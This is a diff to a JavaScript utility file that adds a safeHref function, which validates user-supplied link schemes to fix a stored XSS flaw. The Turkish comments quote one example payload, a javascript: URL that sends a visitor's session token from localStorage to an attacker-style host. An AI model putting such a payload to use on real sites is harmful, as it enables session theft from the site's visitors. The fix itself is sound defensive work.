@@ -685,3 +685,40 @@ export function monthGrid(year, month) {
   for (let d = 1; d <= daysInMonth; d++) cells.push(new Date(year, month, d));
   return cells;
 }
+
+// ==================== GÜVENLİK: KULLANICIDAN GELEN BAĞLANTILARIN DENETİMİ ====================
+// GÜVENLİK AÇIĞI (site geneli denetimde bulundu): kullanıcıların girdiği bazı adresler doğrudan
+// bir <a href> içine konuyordu — ilan sahibinin girdiği "ekspertiz raporu linki"
+// (inspectionReportUrl) ve iş başvurusuna eklenen CV bağlantısı (cvUrl).
+//
+// Neden tehlikeli: href yalnızca http/https olmak zorunda değil. Kötü niyetli bir satıcı
+// `javascript:fetch("https://kotu.site/"+localStorage.getItem("fixperto_session_v1"))` yazarsa,
+// o bağlantıya tıklayan HER ziyaretçinin tarayıcısında bu kod çalışır ve oturum token'ı çalınır.
+// Aynı şekilde `data:text/html,<script>…</script>` da sayfa açar. Bu, klasik bir DEPOLANMIŞ XSS:
+// saldırgan kodu bir kez kaydeder, kurbanlar sonradan tetikler.
+//
+// Çözüm: adresi göstermeden önce şemasını denetlemek. İzin verilenler dışındaki her şey için null
+// dönüyoruz; çağıran taraf bağlantıyı hiç göstermiyor. Beyaz liste (izin verilenleri say) kara
+// listeden (yasaklıları say) daha güvenli — atlanan bir şema varsayılan olarak REDDEDİLİYOR.
+const SAFE_LINK_SCHEMES = ["http:", "https:", "mailto:", "tel:"];
+// CV yüklemesi dosyayı data: URI olarak saklıyor (bkz. jobApplyCv). Bu yüzden data: tamamen
+// yasaklanamıyor — ama SADECE zararsız içerik türlerine izin veriliyor. data:text/html asla.
+const SAFE_DATA_PREFIXES = ["data:application/pdf", "data:image/png", "data:image/jpeg", "data:image/jpg", "data:image/webp", "data:image/gif"];
+
+/** Güvenliyse adresin kendisi, değilse null. `null` dönerse bağlantı HİÇ gösterilmemeli. */
+export function safeHref(value) {
+  const raw = String(value ?? "").trim();
+  if (!raw) return null;
+  const lower = raw.toLowerCase();
+  if (lower.startsWith("data:")) {
+    return SAFE_DATA_PREFIXES.some((p) => lower.startsWith(p)) ? raw : null;
+  }
+  try {
+    // Şema yoksa ("ornek.com/rapor.pdf") kullanıcı büyük ihtimalle https demek istiyor; bunu
+    // reddetmek yerine https'e tamamlıyoruz — aksi halde geçerli bağlantılar kaybolurdu.
+    const url = new URL(/^[a-z][a-z0-9+.-]*:/i.test(raw) ? raw : `https://${raw}`);
+    return SAFE_LINK_SCHEMES.includes(url.protocol) ? url.href : null;
+  } catch {
+    return null; // ayrıştırılamayan adres = gösterilmez
+  }
+}
